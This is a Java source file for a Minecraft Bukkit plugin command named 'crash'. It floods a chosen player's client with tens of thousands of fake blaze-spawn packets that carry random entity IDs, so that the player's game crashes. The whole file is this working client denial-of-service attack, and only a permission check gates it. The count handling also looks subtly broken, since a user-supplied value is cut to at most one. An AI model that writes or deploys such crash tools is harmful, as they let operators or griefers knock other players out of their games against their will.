package ru.dehasher.bukkit.commands.list;

import org.bukkit.Location;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;

import ru.dehasher.bukkit.HCore;
import ru.dehasher.bukkit.api.protocollib.WrapperPlayServerSpawnEntityLiving;
import ru.dehasher.bukkit.managers.Informer;
import ru.dehasher.bukkit.managers.Methods;

public class crash {
    public static boolean send(CommandSender sender, String command, String[] args) {
        int length    = args.length;
        Player player = null;
        String info   = Methods.getCommandInfo(command);

        if (sender instanceof Player) player = (Player) sender;

        if (Methods.isPerm(player, "hcore.command.crash")) {
            if (length > 0) {
                Player target = HCore.getPlugin().getServer().getPlayer(args[0]);
                if (target == null || !target.isOnline()) {
                    Informer.send(player, HCore.lang.getString("errors.player-not-found"));
                } else {
                    if (!Methods.isPerm(target, "hcore.command.crash.exempt")) {
                        if (HCore.ProtocolLib) {
                            Location loc = target.getLocation();
                            WrapperPlayServerSpawnEntityLiving packet = new WrapperPlayServerSpawnEntityLiving();

                            packet.setType(EntityType.BLAZE);
                            packet.setX(loc.getX());
                            packet.setY(loc.getY());
                            packet.setZ(loc.getZ());

                            int count = (length > 1) ? Math.min(Integer.parseInt(args[1]), 1) : 30000;
                            if (count > 500000 && !Methods.isPerm(player, null)) count = 500000;

                            for (int i = 0; i < count; i++) {
                                int entityID = (int) (Math.random() * Integer.MAX_VALUE);
                                packet.setEntityID(entityID);
                                packet.sendPacket(target);
                            }

                            Informer.send(player, HCore.lang.getString("commands.crash.success")
                                    .replace("{player}", target.getName())
                            );

                            return true;
                        } else {
                            Informer.send(player, HCore.lang.getString("errors.no-plugin")
                                    .replace("{plugin}", "ProtocolLib")
                            );
                        }
                    } else {
                        Informer.send(player, HCore.lang.getString("commands.crash.error"));
                    }
                }
            } else {
                Informer.send(player, info);
            }
        } else {
            Informer.send(player, HCore.lang.getString("errors.no-perm"));
        }
        return false;
    }
}